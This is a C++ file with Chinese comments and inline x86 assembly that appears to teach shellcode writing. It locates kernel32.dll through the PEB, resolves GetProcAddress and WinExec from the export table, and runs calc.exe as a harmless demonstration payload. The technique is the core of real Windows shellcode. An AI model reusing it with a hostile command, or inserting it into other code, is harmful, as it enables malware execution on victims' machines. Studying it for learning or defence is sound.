﻿// shellcodeCreate.cpp: 定義主控台應用程式的進入點。
//

#include "stdafx.h"

/*
1.檢查Function所需要的dll，以WinExec()為例，先取得Kernel32.dll地址
2.透過Kernel32.dll內取得WinExec()的地址或取得GetProcAddress()地址來取得WinExec()的地址
3.Push參數、使用該函數
*/



int main()
{
	__asm { 
		//Get Kernel32.dll address
		xor ecx, ecx
		mov eax, fs:[ecx + 0x30]					//EAX = PEB
		mov eax, [eax + 0xc]						//EAX = PEB->Ldr
		mov esi, [eax + 0x14]						//ESI = PEB->Ldr.InMemOrder
		lodsd								//EAX = ntdll.dll
		xchg eax, esi								
		lodsd								//EAX = Third(kernel32)
		mov ebx, [eax + 0x10]						//EBX = Address of Kernel32.dll

		//Located to it's exported table
		mov edx, [ebx + 0x3c]						//EDX = e_lfanew = F8
		add edx, ebx							//EDX = Address of PE Header
		mov edx, [edx + 0x18 + 0x60]					//EDX = 0x000EAD80 RVA of EAT  0x18--size of Magic + NT header、0x60--size of Optional Header
		add edx, ebx							//EDX = Address of Kernel32.dll +  Real Address of EAT
		mov esi, [edx + 0x20]						//ESI = 0x000EC5EC  = Value of AddressOfNames
		add esi, ebx							//ESI = Address of Kernel32.dll + Value of AddressOfNames
		xor ecx, ecx							//ECX = 0 

		//Find GetProcAddress function name
		Get_Function:
			inc ecx							//ECX++
			lodsd							//Mov eax, dword ptr ds:[esi]、EAX = RVA of First Function Name		
			add eax, ebx						//EAX = Real Address of First Function Name
			cmp dword ptr[eax], 0x50746547				//GetP
			jnz Get_Function
			cmp dword ptr[eax + 0x4], 0x41636f72			//rocA
			jnz Get_Function
			cmp dword ptr[eax + 0x8], 0x65726464			//ddre
			jnz Get_Function					//EAX = Address of GetProcAddress Name

		//Find the address of GetProcAddress function
			mov esi, [edx + 0x24]					//ESI = Address of Kernel32.dll +  Real Address of EAT + offset of AddressOfNameOrdinals
			add esi, ebx						//ESI = Ordinals table
			mov cx, [esi + ecx * 2]					//Number of function
			dec ecx							//ECX-- 
			mov esi, [edx + 0x1c]					//Offset address table
			add esi, ebx						//ESI = Address table
			mov edx, [esi + ecx * 4]				//EDX = Pointer(offset)
			add edx, ebx						//EDX = Address of  GetProcAddress()

		//Find WinExec function address
			mov esi, edx						//Save Address of  GetProcAddress in ESI
			push 0x00636578						//xec
			push 0x456e6957						//WinE
			//Function Variable Starts Here !!
			push esp						//"WinExec\0"
			push ebx						//Push Kernel32.dll baes address in stack
			call edx						//EDX = GetProcAddress("Address of kernel32.dll","WinExec") = Address of WinExec()

		//Call WinExec function
			add esp,0x4
			xor ecx, ecx						//ECX = 0
			push ecx
			push 0x6578652e						//calc.exe 
			push 0x636c6163
			//Function Variable Starts Here !!
			push esp						//calc.exe
			call eax						//Winexec("calc.exe", 0)
			add esp,0xC
	};

    return 0;
}

